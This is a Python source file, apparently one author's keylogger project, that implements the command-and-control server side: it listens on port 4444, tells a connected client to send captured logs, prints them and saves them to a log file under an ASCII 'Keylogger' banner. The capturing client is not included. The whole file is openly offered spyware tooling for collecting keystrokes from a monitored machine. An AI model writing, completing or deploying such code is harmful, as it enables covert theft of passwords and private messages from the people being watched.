from colorama import Fore, init
from datetime import datetime
from pystyle import *
import socket
import os

Success = Colors.green + "[+]" + Colors.reset
Error = Colors.red + "[-]" + Colors.reset
Info = Colors.blue + "[*]" + Colors.reset

init(autoreset=True)

LOG_FILE = os.path.join('logs', 'app.log')


def save_to_file(data):
    try:
        log_dir = os.path.dirname(LOG_FILE)
        if log_dir and not os.path.exists(log_dir):
            os.makedirs(log_dir, exist_ok=True)
        
        with open(LOG_FILE, 'a', encoding='utf-8') as f:
            timestamp = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
            f.write(f"Логи от {timestamp}\n\n")
            f.write(str(data))
            f.write("\n\n")
        
        print(f"{Success} Логи сохранены в файл: {LOG_FILE}")
    
    except PermissionError:
        print(f"{Error} Ошибка доступа: нет прав для записи в файл {LOG_FILE}")
    except Exception as e:
        print(f"{Error} Ошибка при сохранении логов: {str(e)}")


def keylogger():
    display_banner()
    
    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.bind(('127.0.0.1', 4444))
    server.listen(5)
    print(f"\n{Success} Сервер запущен - (Ожидание подключения...)")

    try:
        while True:
            client, addr = server.accept()
            print(f"\n{Success} Подключен клиент: {addr[0]}:{addr[1]}")

            try:
                while True:
                    print("\n[!] logs - Получить логи \n[!] break - Прекратить работу сервера")
                    command = input(f"\n{Info} Введите команду: ").strip()
                    
                    if not command:
                        continue

                    client.send(command.encode())

                    if command.lower() == 'break':
                        print(f"\n{Info} Отключение клиента...")
                        break

                    data = client.recv(4096).decode()
                    if not data:
                        print(f"\n{Error} Клиент отключился.")
                        break

                    print(f"\n{Success} Получены логи от клиента:")
                    print(f"\n{data}\n")
                    
                    save_to_file(data)

            except (ConnectionResetError, BrokenPipeError):
                print(f"\n{Error} Клиент неожиданно отключился!")

            finally:
                client.close()
                print(f"{Info} Соединение с клиентом закрыто.")
                print("")
                break

    except KeyboardInterrupt:
        print(f"\n{Info} Сервер остановлен.")
        print("")
    finally:
        server.close()


def display_banner():
    os.system('cls' if os.name == 'nt' else 'clear')
    print(Fore.CYAN + """
    █████   ████                     █████                                                    
    ░░███   ███░                     ░░███                                                     
    ░███  ███     ██████  █████ ████ ░███         ██████   ███████  ███████  ██████  ████████ 
    ░███████     ███░░███░░███ ░███  ░███        ███░░███ ███░░███ ███░░███ ███░░███░░███░░███
    ░███░░███   ░███████  ░███ ░███  ░███       ░███ ░███░███ ░███░███ ░███░███████  ░███ ░░░ 
    ░███ ░░███  ░███░░░   ░███ ░███  ░███      █░███ ░███░███ ░███░███ ░███░███░░░   ░███     
    █████ ░░████░░██████  ░░███████  ███████████░░██████ ░░███████░░███████░░██████  █████    
    ░░░░░   ░░░░  ░░░░░░    ░░░░░███ ░░░░░░░░░░░  ░░░░░░   ░░░░░███ ░░░░░███ ░░░░░░  ░░░░░     
                            ███ ░███                       ███ ░███ ███ ░███                   
                            ░░██████                       ░░██████ ░░██████                    
                            ░░░░░░                         ░░░░░░   ░░░░░░                     

                                [https://github.com/DenisPythoneer]                                                                                     
    """)


def main():
    keylogger()


if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:

        print(Colors.green + "\nДо свидания!" + Colors.reset)
